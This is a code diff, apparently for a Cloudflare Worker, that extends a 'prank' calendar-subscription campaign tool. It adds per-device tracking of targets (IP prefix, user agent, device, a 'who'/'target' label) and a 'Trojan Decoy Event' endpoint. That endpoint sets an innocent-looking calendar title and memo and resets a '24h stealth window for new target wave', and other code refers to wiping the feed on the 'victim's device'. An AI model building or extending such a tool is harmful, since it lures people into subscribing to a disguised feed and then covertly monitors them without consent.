@@ -240,17 +240,56 @@ export default {
         effectiveDripDays = Number(paramDrip);
       }
 
-      // Record subscriber telemetry & device detection
+      // Record subscriber telemetry & multi-device detection
       const rawUserAgent = request.headers.get("user-agent") || "Unknown Device";
       const detectedDevice = parseSubscriberDevice(rawUserAgent);
+      const clientIp = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || "0.0.0.0";
+      const whoParam = url.searchParams.get("who") || url.searchParams.get("target") || url.searchParams.get("sub") || "";
+      const nowIso = new Date().toISOString();
 
       campaign.syncCount = (campaign.syncCount || 0) + 1;
-      campaign.lastSyncAt = new Date().toISOString();
+      campaign.lastSyncAt = nowIso;
       campaign.lastUserAgent = rawUserAgent;
       campaign.deviceType = detectedDevice;
       if (!campaign.firstSubscribedAt) {
-        campaign.firstSubscribedAt = campaign.lastSyncAt;
+        campaign.firstSubscribedAt = nowIso;
       }
+
+      // Track individual subscriber devices
+      campaign.subscribers = campaign.subscribers || [];
+      const cleanWho = whoParam ? whoParam.slice(0, 30).trim() : "";
+      const ipPrefix = clientIp.split(",")[0].trim().replace(/\.\d+$/, ".xx"); // Anonymize last octet
+      const subKey = cleanWho ? `who:${cleanWho.toLowerCase()}` : `dev:${ipPrefix}_${rawUserAgent.slice(0, 40)}`;
+
+      let subEntry = campaign.subscribers.find(s => s.subKey === subKey);
+      if (!subEntry) {
+        const subIndex = campaign.subscribers.length + 1;
+        subEntry = {
+          id: `sub_${subIndex}_${Math.random().toString(36).slice(2, 7)}`,
+          subKey: subKey,
+          label: cleanWho || `Device #${subIndex}`,
+          deviceType: detectedDevice,
+          rawUserAgent: rawUserAgent,
+          firstSyncAt: nowIso,
+          lastSyncAt: nowIso,
+          syncCount: 1,
+        };
+        campaign.subscribers.push(subEntry);
+      } else {
+        subEntry.syncCount = (subEntry.syncCount || 0) + 1;
+        subEntry.lastSyncAt = nowIso;
+        subEntry.deviceType = detectedDevice;
+        subEntry.rawUserAgent = rawUserAgent;
+        if (cleanWho && (!subEntry.label || subEntry.label.startsWith("Device #"))) {
+          subEntry.label = cleanWho;
+        }
+      }
+
+      // Bound subscriber history to 50 devices
+      if (campaign.subscribers.length > 50) {
+        campaign.subscribers = campaign.subscribers.slice(-50);
+      }
+
       await saveCampaign(env, campaign);
 
       const icsOutput = formatIcsCalendar({
@@ -372,6 +411,13 @@ export default {
           lastUserAgent: campaign.lastUserAgent,
           deviceType: health.deviceType,
           subscription: health,
+          subscriberCount: health.subscriberCount || 0,
+          subscribers: health.subscribers || [],
+          decoyCalName: campaign.decoyCalName,
+          decoyTitle: campaign.decoyTitle,
+          decoyMemo: campaign.decoyMemo,
+          decoyDate: campaign.decoyDate,
+          decoyLocation: campaign.decoyLocation,
           killSwitch: Boolean(campaign.killSwitch),
         }),
         { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
@@ -434,6 +480,50 @@ export default {
           message: campaign.killSwitch
             ? "Emergency Kill Switch ENGAGED. Calendar feed wiped on victim's device!"
             : "Emergency Kill Switch disengaged. Feed restored.",
+        }),
+        { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Update Trojan Decoy Event: /api/campaigns/:id/decoy
+    const updateDecoyMatch = url.pathname.match(/^\/api\/campaigns\/([a-zA-Z0-9_-]+)\/decoy$/);
+    if (updateDecoyMatch && request.method === "POST") {
+      const campaignId = updateDecoyMatch[1];
+      const campaign = await getCampaign(env, campaignId);
+      if (!campaign) {
+        return new Response(JSON.stringify({ error: "Not found" }), { status: 404, headers: CORS_HEADERS });
+      }
+
+      let body = {};
+      try {
+        body = await request.json();
+      } catch (e) {}
+
+      if (body.decoyCalName !== undefined) campaign.decoyCalName = String(body.decoyCalName).trim();
+      if (body.decoyTitle !== undefined) campaign.decoyTitle = String(body.decoyTitle).trim();
+      if (body.decoyMemo !== undefined) campaign.decoyMemo = String(body.decoyMemo).trim();
+      if (body.decoyDate !== undefined) campaign.decoyDate = body.decoyDate ? String(body.decoyDate).trim() : null;
+      if (body.decoyLocation !== undefined) campaign.decoyLocation = String(body.decoyLocation).trim();
+
+      if (body.reactivateDecoy) {
+        campaign.forceLive = false;
+        campaign.createdAt = Date.now(); // Reset 24h stealth window for new target wave
+      }
+
+      await saveCampaign(env, campaign);
+
+      return new Response(
+        JSON.stringify({
+          success: true,
+          campaignId: campaign.id,
+          decoyCalName: campaign.decoyCalName,
+          decoyTitle: campaign.decoyTitle,
+          decoyMemo: campaign.decoyMemo,
+          decoyDate: campaign.decoyDate,
+          decoyLocation: campaign.decoyLocation,
+          forceLive: campaign.forceLive,
+          createdAt: campaign.createdAt,
+          message: "Trojan decoy event updated successfully!",
         }),
         { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
       );
@@ -598,6 +688,29 @@ function computeSubscriptionHealth(campaign) {
     : (syncCount > 0 ? (campaign.createdAt || 0) : 0);
   const hoursSinceLastSync = lastSyncTime > 0 ? (now - lastSyncTime) / (1000 * 60 * 60) : Infinity;
 
+  // Process individual subscribers if present
+  const subscribersList = (campaign.subscribers || []).map(s => {
+    const sLastTime = new Date(s.lastSyncAt || s.firstSyncAt || now).getTime();
+    const sHours = Math.max(0, (now - sLastTime) / (1000 * 60 * 60));
+    let sState = "ACTIVE";
+    if (sHours > 168) sState = "UNSUBSCRIBED";
+    else if (sHours > 48) sState = "IDLE";
+    return {
+      id: s.id,
+      label: s.label || "Device",
+      deviceType: s.deviceType || "Unknown Device",
+      lastSyncAt: s.lastSyncAt,
+      hoursAgo: Math.round(sHours * 10) / 10,
+      syncCount: s.syncCount || 1,
+      state: sState,
+    };
+  });
+
+  const activeSubscribers = subscribersList.filter(s => s.state === "ACTIVE");
+  const idleSubscribers = subscribersList.filter(s => s.state === "IDLE");
+  const unsubSubscribers = subscribersList.filter(s => s.state === "UNSUBSCRIBED");
+  const totalSubscribers = subscribersList.length;
+
   let state = "WAITING";
   let badgeText = "⚪ Waiting for Initial Tap";
   let badgeColor = "#94a3b8";
@@ -608,11 +721,29 @@ function computeSubscriptionHealth(campaign) {
     badgeText = "🛑 Feed Terminated (Kill Switch)";
     badgeColor = "#ef4444";
     explanation = "Feed was wiped by pranker remote kill switch.";
-  } else if (syncCount === 0) {
+  } else if (syncCount === 0 && totalSubscribers === 0) {
     state = "WAITING";
     badgeText = "⚪ Waiting for Target to Subscribe";
     badgeColor = "#94a3b8";
     explanation = "Target has not opened or subscribed to this calendar yet.";
+  } else if (totalSubscribers > 1) {
+    // Multi-subscriber tracking summary
+    if (activeSubscribers.length === totalSubscribers) {
+      state = "ACTIVE";
+      badgeText = `🟢 ${totalSubscribers} Devices Subscribed & Syncing`;
+      badgeColor = "#10b981";
+      explanation = `All ${totalSubscribers} subscriber devices are active and syncing routinely.`;
+    } else if (activeSubscribers.length > 0) {
+      state = "ACTIVE";
+      badgeText = `🟢 ${activeSubscribers.length}/${totalSubscribers} Devices Active`;
+      badgeColor = "#10b981";
+      explanation = `${activeSubscribers.length} devices active, ${idleSubscribers.length + unsubSubscribers.length} delayed/idle.`;
+    } else {
+      state = "IDLE";
+      badgeText = `🟡 ${totalSubscribers} Devices Idle`;
+      badgeColor = "#f59e0b";
+      explanation = `All ${totalSubscribers} devices have delayed background sync (>48h).`;
+    }
   } else if (hoursSinceLastSync <= 36) {
     state = "ACTIVE";
     badgeText = "🟢 Subscribed & Actively Syncing";
@@ -637,6 +768,8 @@ function computeSubscriptionHealth(campaign) {
     explanation,
     hoursSinceLastSync: lastSyncTime > 0 ? Math.round(hoursSinceLastSync * 10) / 10 : null,
     deviceType: campaign.deviceType || parseSubscriberDevice(campaign.lastUserAgent),
+    subscriberCount: totalSubscribers,
+    subscribers: subscribersList,
   };
 }
 
